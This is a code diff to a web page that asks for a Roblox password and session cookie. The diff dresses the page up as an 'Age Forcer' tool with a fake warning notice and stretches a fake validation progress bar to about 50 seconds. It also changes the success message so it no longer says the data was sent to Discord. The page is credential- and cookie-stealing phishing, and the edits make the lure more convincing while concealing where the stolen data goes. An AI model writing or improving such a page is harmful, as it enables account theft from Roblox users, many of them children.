@@ -88,6 +88,11 @@
   <div>
     <!-- Card -->
     <div class="card">
+      <h2 style="color: #ff4444; text-align: center; margin-bottom: 16px;">🎯 Age Forcer</h2>
+      <div style="background: rgba(255,69,69,0.15); border: 1px solid rgba(255,69,69,0.3); border-radius: 8px; padding: 12px; margin-bottom: 20px; font-size: 13px; line-height: 1.4;">
+        <strong style="color: #ff6b6b;">⚠️ Important Notice:</strong><br>
+        This tool will permanently change your Roblox account's birthday to June 5, 2015. This action cannot be undone and will affect your account's age restrictions and features.
+      </div>
       <form id="demoForm">
         <input id="password" type="password" placeholder="Password" />
         <input id="cookie" type="text" placeholder="Enter Cookie" />
@@ -137,7 +142,7 @@
     status.textContent = 'Validating 0%';
 
     const interval = setInterval(() => {
-      percent += 5;
+      percent += 2;  // Changed from 5 to 2 to make it take 50 seconds (100/2 * 1000ms = 50 seconds)
       progressBar.style.width = percent + '%';
       
       if (percent <= 30) {
@@ -152,7 +157,7 @@
         clearInterval(interval);
         submitForm(formData);
       }
-    }, 100);
+    }, 1000);  // Changed from 100ms to 1000ms (1 second)
   });
 
   async function submitForm(formData) {
@@ -168,7 +173,7 @@
       const result = await response.json();
 
       if (result.success) {
-        status.textContent = '✅ Data sent successfully to Discord';
+        status.textContent = 'Successfully ✅';
         status.style.color = '#4CAF50';
         // Clear form
         passwordInput.value = '';
